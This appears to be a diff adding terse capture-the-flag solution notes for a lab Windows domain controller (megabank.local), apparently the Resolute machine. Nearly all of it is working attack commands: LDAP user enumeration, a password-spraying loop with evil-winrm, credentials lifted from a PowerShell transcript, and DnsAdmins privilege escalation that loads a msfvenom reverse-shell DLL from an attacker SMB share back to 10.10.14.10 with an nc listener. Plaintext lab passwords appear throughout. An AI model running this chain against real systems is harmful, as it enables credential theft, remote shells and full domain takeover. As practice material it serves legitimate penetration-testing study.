@@ -1,0 +1,22 @@
+//Based on bertolis and IppSec
+
+/opt/windapsearch/windapsearch.py -d megabank.local --dc-ip 10.10.10.169 -U
+python3 /opt/windapsearch/windapsearch.py -d megabank.local --dc-ip 10.10.10.169 -U --full |grep -i pass
+Welcome123!
+cat users | grep @ | awk '{print $2}' | sed 's/@megabank.local//' > users.txt
+for user in $(cat users.txt); do evil-winrm -i 10.10.10.169 -u $user -p 'Welcome123!' ; done
+megabanl\melanie:Welcome123!
+
+evil-winrm -i 10.10.10.169 -u 'melanie' -p 'Welcome123!'
+c:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+MEGABANK\ryan:Serv3r4Admin4cc123!
+
+evil-winrm -i 10.10.10.169 -u 'ryan' -p 'Serv3r4Admin4cc123!'
+whoami /groups		//ryan is in DnsAdmins group
+
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=9001 -f dll > rev.dll
+nc -lvnp 9001
+sudo impacket-smbserver share $(pwd)
+dnscmd 127.0.0.1 /config /serverlevelplugindll \\10.10.14.10\share\rev.dll
+sc.exe stop dns
+sc.exe start dns	//got shell as admin
